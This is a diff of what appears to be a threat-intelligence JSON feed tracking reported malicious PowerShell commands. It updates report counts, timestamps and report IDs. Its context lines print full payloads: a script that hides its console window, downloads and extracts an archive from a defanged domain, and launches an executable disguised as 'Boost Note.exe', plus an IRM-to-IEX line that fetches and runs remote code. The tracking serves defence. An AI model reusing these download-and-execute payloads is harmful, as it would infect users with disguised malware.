@@ -779,9 +779,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 49,
+    "ReportCount": 50,
     "FirstSeen": "2026-11-10T04:54:46.148000+00:00",
-    "LastSeen": "2026-11-16T22:13:07.976000+00:00",
+    "LastSeen": "2026-11-17T01:21:32.121000+00:00",
     "ReportIds": [
       "cmwa7uhjs07yx0omlfjdv2k9y",
       "cmwafa1yg08ee0omlkfez3dt8",
@@ -831,7 +831,8 @@
       "cmwjbc38k17of0omlpeppcn8t",
       "cmwjgldww18ag0omls2876jau",
       "cmwjslc4f18z40omlmg91ed88",
-      "cmwjtkxy018zw0omloccp4asm"
+      "cmwjtkxy018zw0omloccp4asm",
+      "cmwk0b89t19c30oml69o3fcb7"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -942,11 +943,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 16,
-    "FirstSeen": "2026-11-10T01:01:52.755000+00:00",
+    "ReportCount": 15,
+    "FirstSeen": "2026-11-10T04:37:57.278000+00:00",
     "LastSeen": "2026-11-14T14:43:31.633000+00:00",
     "ReportIds": [
-      "cmw9zizln07hd0oml2za1wlqb",
       "cmwa78v3607w70omluib5p702",
       "cmwat1pv303q80omli9ph0e1z",
       "cmwat3unn03te0omlzgthlvd5",
